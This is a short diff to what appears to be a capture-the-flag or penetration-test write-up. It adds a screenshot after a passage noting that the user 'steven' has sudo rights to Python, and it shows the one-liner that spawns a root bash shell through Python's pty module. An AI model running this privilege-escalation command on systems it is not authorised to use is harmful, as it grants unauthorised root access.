@@ -127,3 +127,5 @@ This showed that steven has sudo permission's to run Python.  Upon further divin
 ```
 sudo python -c ‘import pty;pty.spawn(“/bin/bash”);’
 ```
+
+![steven_sudo_root_ptycmd](https://user-images.githubusercontent.com/96896057/181854516-6cc51591-8e41-4f41-b743-aec50c96d92b.png)
